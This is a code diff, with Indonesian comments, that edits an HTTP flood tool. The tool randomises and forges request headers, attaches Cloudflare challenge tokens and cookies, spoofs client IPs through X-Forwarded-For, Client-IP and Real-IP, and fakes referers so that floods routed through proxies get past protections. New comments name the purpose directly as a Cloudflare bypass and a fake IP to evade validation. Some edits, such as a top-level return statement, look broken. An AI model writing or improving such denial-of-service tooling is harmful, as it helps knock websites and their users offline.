@@ -286,7 +286,7 @@ encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip
 
 controle_header = ["max-age=604800", 'proxy-revalidate', "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", 'public, immutable, max-age=31536000', "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", 'min-fresh', 'private', "public", 's-maxage', "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", 'no-transform', "max-age=31557600", "stale-if-error", 'only-if-cached', "max-age=0", 'must-understand, no-store', "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", 'public, max-age=604800, immutable', "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", 'max-age=604800, stale-while-revalidate=86400', "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", 'public, s-maxage=600, max-age=60', 'public, max-age=31536000', "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"];
 
-const Methods = [ "GET", ];
+const Methods = [ "GET" ];
 const lintarMethod= Methods[Math.floor(Math.random() * Methods.length)];
 const queryStrings = ['&', '='];
 const pathts = ["?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
@@ -459,35 +459,52 @@ const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];
 }
 
  const Socker = new NetSocket();
-headers[":method"] = lintarMethod;
-headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+
+// Tambahkan validasi dan inisialisasi variabel penting
+if (!lintarMethod || !parsedTarget || !pathts || !randomHeaders) {
+    throw new Error("Parameter penting tidak tersedia.");
+}
+
+// Menyusun header permintaan
+headers[":method"] = "GET";
+headers[":path"] =
+    parsedTarget.path +
+    pathts[Math.floor(Math.random() * pathts.length)] + 
+    "&" + randomString(10) + queryString + randomString(10);
 headers["origin"] = parsedTarget.host;
 headers[":scheme"] = "https";
-headers["accept"] = randomHeaders['accept'];
-headers["accept-language"] = randomHeaders['accept-language'];
-headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
-headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
-headers["accept-encoding"] = randomHeaders['accept-encoding'];
-headers["cache-control"] = randomHeaders['cache-control'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+
+// Header yang diacak
+headers["accept"] = randomHeaders["accept"];
+headers["accept-language"] = randomHeaders["accept-language"];
+headers["referrer-policy"] = randomHeaders["Referrer-Policy"];
+headers["content-security-policy"] = randomHeaders["Content-Security-Policy"];
+headers["accept-encoding"] = randomHeaders["accept-encoding"];
+headers["cache-control"] = "no-cache"; // Bypass cache
+headers["sec-ch-ua-platform"] = randomHeaders["sec-ch-ua-platform"];
 headers["upgrade-insecure-requests"] = "1";
-headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
-headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
-headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
-headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
-headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "same-origin";
+headers["sec-ch-ua"] = randomHeaders["sec-ch-ua"];
+headers["sec-ch-ua-mobile"] = randomHeaders["sec-ch-ua-mobile"];
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["TE"] = trailers;
+
+// Tambahkan logika bypass Cloudflare
 headers["set-cookie"] = CookieCf;
-headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));
-headers["cf-cache-status"] = "BYPASS, DYNAMIC";
-headers["cache-control"] = "no-cache";
-headers["X-Forwarded-For"] = fakeIP;
+headers["cookie"] = cookieString(scp.parse(response["set-cookie"])); // Parse cookie dari Cloudflare
+headers["cf-cache-status"] = "BYPASS";
+headers["X-Forwarded-For"] = fakeIP; // IP palsu untuk melewati validasi
 headers["X-Forwarded-Host"] = fakeIP;
 headers["Client-IP"] = fakeIP;
 headers["Real-IP"] = fakeIP;
-headers["Referer"] = randomReferer;
+
+// Tambahkan logika referer palsu
+headers["Referer"] = randomReferer || `https://${parsedTarget.host}/`;
+
+// Mengembalikan objek header
+return headers;
 
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
